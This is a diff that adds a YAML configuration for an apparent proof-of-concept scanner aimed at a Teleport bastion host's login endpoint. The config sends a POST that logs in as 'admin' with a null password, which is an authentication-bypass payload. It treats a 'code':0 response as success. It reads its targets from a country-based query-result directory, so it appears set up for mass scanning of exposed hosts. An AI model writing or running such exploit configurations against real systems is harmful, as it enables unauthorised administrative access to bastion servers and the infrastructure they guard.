@@ -1,0 +1,15 @@
+targetPath: /auth/do-login
+targetMethod: post
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+targetJson: args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: \"code\"\s*:\s*0
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/teleport堡垒机任意登陆/
+targetRestText: True
